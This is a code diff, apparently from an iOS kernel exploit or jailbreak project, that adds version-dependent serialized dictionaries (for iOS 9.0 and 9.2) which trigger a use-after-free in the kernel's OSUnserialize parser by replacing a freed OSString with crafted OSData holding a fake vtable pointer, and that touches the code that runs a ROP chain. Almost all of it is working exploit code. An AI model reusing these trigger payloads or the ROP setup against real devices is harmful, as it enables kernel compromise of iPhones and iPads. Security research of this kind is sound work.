@@ -7,6 +7,7 @@
 #include <mach/vm_map.h>
 
 #include "common.h"             // DEBUG, PRINT_BUF, file_t
+#include "device.h"             // V_*, get_os_version
 #include "io.h"                 // kOS*, OSString, dict_parse
 #include "rop.h"                // get_stack_pivot
 #include "slide.h"              // get_kernel_slide
@@ -20,40 +21,84 @@ void uaf_parse(const OSString *fake)
     const uint32_t *data = (const uint32_t*)fake;
     PRINT_BUF("Data", data, sizeof(OSString));
 
-    const char str[4] = "str",
-               ref[4] = "ref";
-    uint32_t dict[8 + sizeof(OSString) / sizeof(uint32_t)] =
-    {
-        kOSSerializeMagic,                                          // Magic
-        kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries
+    const char str[] = "str",
+               ref[] = "ref";
 
-        kOSSerializeString | 4,                                     // String that will get freed
-        *((uint32_t*)str),
-        kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
+    if(get_os_version() >= V_13C75) // 9.2
+    {
+        uint32_t dict_92[] =
+        {
+            kOSSerializeMagic,                                          // Magic
+            kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries
+
+            kOSSerializeString | 4,                                     // String that will get freed
+            *((uint32_t*)str),
+            kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
 #ifdef __LP64__
-        data[0],                                                    // vtable pointer (lower half)
-        data[1],                                                    // vtable pointer (upper half)
-        data[2],                                                    // retainCount
-        data[3],                                                    // flags
-        data[4],                                                    // length
-        data[5],                                                    // (padding)
-        data[6],                                                    // string pointer (lower half)
-        data[7],                                                    // string pointer (upper half)
+            data[0],                                                    // vtable pointer (lower half)
+            data[1],                                                    // vtable pointer (upper half)
+            data[2],                                                    // retainCount
+            data[3],                                                    // flags
+            data[4],                                                    // length
+            data[5],                                                    // (padding)
+            data[6],                                                    // string pointer (lower half)
+            data[7],                                                    // string pointer (upper half)
 #else
-        data[0],                                                    // vtable pointer
-        data[1],                                                    // retainCount
-        data[2],                                                    // flags
-        data[3],                                                    // length
-        data[4],                                                    // string pointer
+            data[0],                                                    // vtable pointer
+            data[1],                                                    // retainCount
+            data[2],                                                    // flags
+            data[3],                                                    // length
+            data[4],                                                    // string pointer
 #endif
 
-        kOSSerializeSymbol | 4,                                     // Whatever name for our reference
-        *((uint32_t*)ref),
-        kOSSerializeEndCollection | kOSSerializeObject | 1,         // Reference to object 1 (OSString)
-    };
-    PRINT_BUF("Dict", dict, sizeof(dict));
+            kOSSerializeSymbol | 4,                                     // Whatever name for our reference
+            *((uint32_t*)ref),
+            kOSSerializeEndCollection | kOSSerializeObject | 1,         // Reference to object 1 (OSString)
+        };
+        PRINT_BUF("dict_92", dict_92, sizeof(dict_92));
+        dict_parse(dict_92, sizeof(dict_92));
+    }
+    else
+    {
+        uint32_t dict_90[] =
+        {
+            kOSSerializeMagic,                                          // Magic
+            kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries
 
-    dict_parse(dict, sizeof(dict));
+            kOSSerializeSymbol | 4,                                     // Just a name
+            *((uint32_t*)str),
+            kOSSerializeString | 4,                                     // String that will get freed
+            *((uint32_t*)str),
+
+            kOSSerializeObject | 1,                                     // Same name
+            kOSSerializeBoolean | 1,                                    // Lightweight value
+
+            kOSSerializeObject | 1,                                     // Same name again
+            kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
+#ifdef __LP64__
+            data[0],                                                    // vtable pointer (lower half)
+            data[1],                                                    // vtable pointer (upper half)
+            data[2],                                                    // retainCount
+            data[3],                                                    // flags
+            data[4],                                                    // length
+            data[5],                                                    // (padding)
+            data[6],                                                    // string pointer (lower half)
+            data[7],                                                    // string pointer (upper half)
+#else
+            data[0],                                                    // vtable pointer
+            data[1],                                                    // retainCount
+            data[2],                                                    // flags
+            data[3],                                                    // length
+            data[4],                                                    // string pointer
+#endif
+
+            kOSSerializeSymbol | 4,                                     // Whatever name for our reference
+            *((uint32_t*)ref),
+            kOSSerializeEndCollection | kOSSerializeObject | 2,         // Reference to object 1 (OSString)
+        };
+        PRINT_BUF("dict_90", dict_90, sizeof(dict_90));
+        dict_parse(dict_90, sizeof(dict_90));
+    }
 }
 
 // Don't risk deallocating this once we acquire it
@@ -86,7 +131,7 @@ void uaf_rop(void)
     DEBUG("Executing ROP chain...");
     usleep(10000); // In case we panic...
 
-    addr_t vtab[5] =
+    addr_t vtab[] =
     {
         0x0,
         0x0,
